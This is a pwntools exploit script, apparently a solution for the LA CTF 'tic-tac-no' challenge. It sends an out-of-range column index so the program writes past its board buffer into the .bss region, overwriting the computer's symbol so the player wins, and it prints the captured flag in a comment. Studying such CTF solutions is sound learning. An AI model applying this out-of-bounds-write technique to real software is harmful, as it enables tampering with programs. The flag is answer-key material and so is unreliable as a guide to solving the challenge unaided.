from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall')
gdb.attach(p, '''
    brva 0x14f3
    continue
''')

# p = remote('chall.lac.tf', 30001)

# integer overflow from 0x4068 to 0x4051 within bss region, overwrite computer's symbol "O" with player's symbol "X"
p.sendlineafter(b"Enter row #(1-3): ", str(1).encode())
p.sendlineafter(b"Enter column #(1-3): ", str(0x4051-0x4068+1).encode())

# win tic-tac-no
p.sendlineafter(b"Enter row #(1-3): ", str(1).encode())
p.sendlineafter(b"Enter column #(1-3): ", str(1).encode())

p.interactive()

# lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}